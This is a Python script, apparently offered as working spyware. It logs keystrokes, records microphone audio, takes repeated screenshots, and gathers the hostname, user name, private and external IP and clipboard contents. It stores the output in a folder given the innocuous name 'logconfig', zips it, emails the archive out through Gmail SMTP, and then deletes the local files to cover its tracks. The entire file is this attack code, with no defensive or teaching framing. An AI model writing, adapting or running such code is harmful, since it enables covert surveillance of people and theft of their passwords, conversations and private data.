# Libraries

import os
import sys
import time
import socket
import smtplib
import getpass
import platform
import threading
import clipboard
import sounddevice as sd
from requests import get
from PIL import ImageGrab
from email import encoders
from zipfile import ZipFile
from datetime import datetime
from dotenv import load_dotenv
from scipy.io.wavfile import write
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from pynput.keyboard import Key, Listener
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from multiprocessing import Process, freeze_support

# colon (:) is not allowed in filenames on Windows. Hence the formatter.

def date_time_formatter(datetime_val):
    return str(datetime_val)[0:10] + "_" +  str(datetime_val)[11:13] + "-" + str(datetime_val)[14:16] + "-" + str(datetime_val)[17:19]

def on_press_func(key):
    try:
        if time.time() > all_info_var.get('stopping_time'):
            listener.stop()
        else:
            key_f.write(key.char)
    except AttributeError:
        key_f.write('(' + str(key) + ')')

def take_screenshot(flag_take_screenshot):
    iteration = 1
    while flag_take_screenshot.is_set():
        screenshot = ImageGrab.grab()
        screenshot.save(logpath + file_prefix + "_" + "screenshot" + str(iteration) + ".png")
        screenshot.close()
        time.sleep(5)
        iteration += 1

def fetch_n_make_logpath():
    global logpath
    if(current_OS == 'Linux'):
        logpath = "/home/" + current_user + "/.cache/" + all_info_var.get('directory_name') + "/"
    elif(current_OS == 'Windows'):
        logpath = "C:\\" + all_info_var.get('directory_name') + "\\"
    
    if not os.path.exists(logpath):
        os.makedirs(logpath)

def fetch_n_write_sys_info():

    sys_details.update({'architecture' : platform.architecture()})
    sys_details.update({'system_info' : platform.system()})
    sys_details.update({'uname' : platform.uname()})
    sys_details.update({'hostname' : socket.gethostname()})
    sys_details.update({'current_user' : current_user})

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
    s.connect(("8.8.8.8", 80))

    sys_details.update({'private_IP' : s.getsockname()[0] }) # returns the private IP of the machine
    sys_details.update({'external_IP' : get('https://api.ipify.org').text})

    sys_f = open(logpath + file_prefix + "_" + all_info_var.get('system_information'), 'a')

    for item in sys_details.items():
        sys_f.write(str(item) + '\n\n')

    sys_f.write('Clipboard Contents: ' + '\n\t' + clipboard.paste() + '\n')

    sys_f.close()

def create_zip_file():
    all_files = os.listdir(logpath)
    global zipfile_name
    global zipfile_full_path
    zipfile_name = 'Zipped_logs_' + date_time_formatter(current_date_time) + '.zip'
    zipfile_full_path = logpath + zipfile_name

    with ZipFile(zipfile_full_path, 'w') as zipobj:
        for file in all_files:
            full_path = logpath + file
            zipobj.write(full_path)

def send_files_over_email():
    subject = "LogFiles - " + str(sys_details.get('hostname')) + " " + str(sys_details.get('current_user')) + " - " + str(datetime.now())
    body = "Loren Ipsum"
    sender_email = os.getenv("SENDER_EMAIL")
    recipient_email = os.getenv("RECEIVER_EMAIL")
    sender_password = os.getenv("SENDER_EMAIL_PWD")
    smtp_server = 'smtp.gmail.com'
    smtp_port = 465

    message = MIMEMultipart()
    message['Subject'] = subject
    message['From'] = sender_email
    message['To'] = recipient_email
    message.attach(MIMEText(body))

    with open(zipfile_full_path,'rb') as file:
        message.attach(MIMEApplication(file.read(), Name=zipfile_name))

    with smtplib.SMTP_SSL(smtp_server, smtp_port) as server:
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, recipient_email, message.as_string())

load_dotenv()

# Variables

sys_details = {}

all_info_var = {'system_information'    : "system.txt",
                'audio_information'     : "audio.wav",
                'keys_information'      : "key_log.txt",
                'directory_name'        : "logconfig",
                'capture_duration'      : 10,
                'stopping_time'         : 0,
                'sampling_freq'         : 44100}

# OS information fetch

current_OS = platform.system()
current_user = os.getlogin()
current_date_time = datetime.now()
logpath = ""

fetch_n_make_logpath()

file_prefix = date_time_formatter(current_date_time)

# System Information

fetch_n_write_sys_info()

# Keylogging, Microphone Capture and Screenshotting

flag_take_screenshot = threading.Event()
flag_take_screenshot.set()
t = threading.Thread(target=take_screenshot, args=(flag_take_screenshot, )) # The comma is required. Otherwise Itereable Error is thrown
t.start()

myrecording = sd.rec(int(all_info_var.get('capture_duration') * all_info_var.get('sampling_freq')), samplerate=all_info_var.get('sampling_freq'), channels=2)

key_f = open(logpath + file_prefix + "_" + all_info_var.get('keys_information'), 'a')

all_info_var.update({'stopping_time' : time.time() + all_info_var.get('capture_duration')})

with Listener(
        on_press=on_press_func) as listener:
    listener.join()

key_f.close()
sd.wait()
write(logpath + file_prefix + "_" + all_info_var.get('audio_information'), all_info_var.get('sampling_freq'), myrecording)

# Stop screenshots after mic and keyboard logging
flag_take_screenshot.clear()

# Creating zipfile of all log files

zipfile_name = ""
zipfile_full_path = ""
create_zip_file()

# Sending the zipfile over Email

send_files_over_email()

#Code to delete all the files after the Zipfile is sent over mail

all_files = os.listdir(logpath)
for file in all_files:
        full_path = logpath + file
        os.remove(full_path)
os.rmdir(logpath)

sys.exit()